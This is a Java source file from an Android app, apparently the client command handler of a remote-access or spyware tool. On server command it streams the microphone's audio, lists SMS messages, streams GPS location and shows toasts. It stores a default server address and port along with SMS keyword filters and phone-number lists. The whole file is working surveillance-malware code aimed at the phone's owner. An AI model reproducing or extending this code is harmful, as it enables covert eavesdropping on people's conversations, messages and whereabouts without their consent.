package Cliente;

import android.content.Intent;
import android.content.SharedPreferences;
import android.widget.Toast;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.StringTokenizer;

import Controlador.PaquetePreferencias;
import Controlador.Protocolo;
import Libreria.Audio;
import Libreria.GPSListener;
import Libreria.SMSListener;

/**
 * Created by Vero on 19/05/2015.
 */
public class ProcessCommand {
    short comm;
    ClientListener client;
    int chan;
    ByteBuffer arguments;
    Intent intent;

    SharedPreferences settings;
    SharedPreferences.Editor editor;

    public ProcessCommand(ClientListener c) {
        this.client = c;
        settings = client.getSharedPreferences("preferences.xml", 0);
        editor = settings.edit();
    }

    public void process(short cmd, byte[] args, int chan) {
        this.comm = cmd;
        this.chan = chan;
        this.arguments = ByteBuffer.wrap(args);
        if (comm == Protocolo.GET_SOUND_STREAM)
        {
            client.sendInformation("Audio streaming request received");
            client.audioStreamer = new Audio(client, arguments.getInt(), chan);
            client.audioStreamer.run();
        } else if (comm == Protocolo.STOP_SOUND_STREAM) {
            client.audioStreamer.stop();
            client.audioStreamer = null;
            client.sendInformation("Audio streaming stopped");
        } else if (comm == Protocolo.DO_TOAST)
        {
            client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
            client.toast.show();

        } else if (comm == Protocolo.GET_SMS)
        {
            client.sendInformation("SMS list request received");
            if(!SMSListener.listSMS(client, chan, arguments.array()))
                client.sendError("No SMS match for filter");

        }else if (comm == Protocolo.GET_GPS_STREAM)
        {
            String provider = new String(arguments.array());

            if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
                client.gps = new GPSListener(client, provider, chan);
                client.sendInformation("Location request received");
            }
            else
                client.sendError("Unknown provider '"+provider+"' for location");

        } else if (comm == Protocolo.STOP_GPS_STREAM)
        {
            client.gps.stop();
            client.gps = null;
            client.sendInformation("Location stopped");

        }

    }
    public PaquetePreferencias loadPreferences()
    {
        PaquetePreferencias p = new PaquetePreferencias();

        SharedPreferences settings = client.getSharedPreferences("preferences", 0);

        p.setIp( settings.getString("ip", "192.168.0.12"));
        p.setPort (settings.getInt("port", 9999));
        p.setWaitTrigger(settings.getBoolean("waitTrigger", false));

        ArrayList<String> smsKeyWords = new ArrayList<String>();
        String keywords = settings.getString("smsKeyWords", "");
        if(keywords.equals(""))
            smsKeyWords = null;
        else {
            StringTokenizer st = new StringTokenizer(keywords, ";");
            while (st.hasMoreTokens())
            {
                smsKeyWords.add(st.nextToken());
            }
            p.setKeywordSMS(smsKeyWords);
        }

        ArrayList<String> whiteListCall = new ArrayList<String>();
        String listCall = settings.getString("numCall", "");
        if(listCall.equals(""))
            whiteListCall = null;
        else {
            StringTokenizer st = new StringTokenizer(listCall, ";");
            while (st.hasMoreTokens())
            {
                whiteListCall.add(st.nextToken());
            }
            p.setPhoneNumberCall(whiteListCall);
        }


        ArrayList<String> whiteListSMS = new ArrayList<String>();
        String listSMS = settings.getString("numSMS", "");
        if(listSMS.equals(""))
            whiteListSMS = null;
        else {
            StringTokenizer st = new StringTokenizer(listSMS, ";");
            while (st.hasMoreTokens())
            {
                whiteListSMS.add(st.nextToken());
            }
            p.setPhoneNumberSMS(whiteListSMS);
        }
        return p;
    }
    private void savePreferences(byte[] data)
    {
        PaquetePreferencias pp = new PaquetePreferencias();
        pp.parse(data);

        SharedPreferences settings = client.getSharedPreferences("preferences", 0);

        SharedPreferences.Editor editor = settings.edit();
        editor.putString("ip", pp.getIp());
        editor.putInt("port", pp.getPort());
        editor.putBoolean("waitTrigger", pp.isWaitTrigger());

        String smsKeyWords = "";
        String numsCall = "";
        String numsSMS = "";

        ArrayList<String> smsKeyWord = pp.getKeywordSMS();
        for (int i = 0; i < smsKeyWord.size(); i++)
        {
            if (i == (smsKeyWord.size() - 1))
                smsKeyWords += smsKeyWord.get(i);
            else
                smsKeyWords += smsKeyWord.get(i) + ";";
        }
        editor.putString("smsKeyWords", smsKeyWords);

        ArrayList<String> whiteListCall = pp.getPhoneNumberCall();
        for (int i = 0; i < whiteListCall.size(); i++)
        {
            if (i == (whiteListCall.size() - 1))
                numsCall += whiteListCall.get(i);
            else
                numsCall += whiteListCall.get(i) + ";";
        }
        editor.putString("numCall", numsCall);


        ArrayList<String> whiteListSMS = pp.getPhoneNumberSMS();
        for (int i = 0; i < whiteListSMS.size(); i++)
        {
            if (i == (whiteListSMS.size() - 1))
                numsSMS += whiteListSMS.get(i);
            else
                numsSMS += whiteListSMS.get(i) + ";";
        }
        editor.putString("numSMS", numsSMS);
        editor.commit();

    }


}
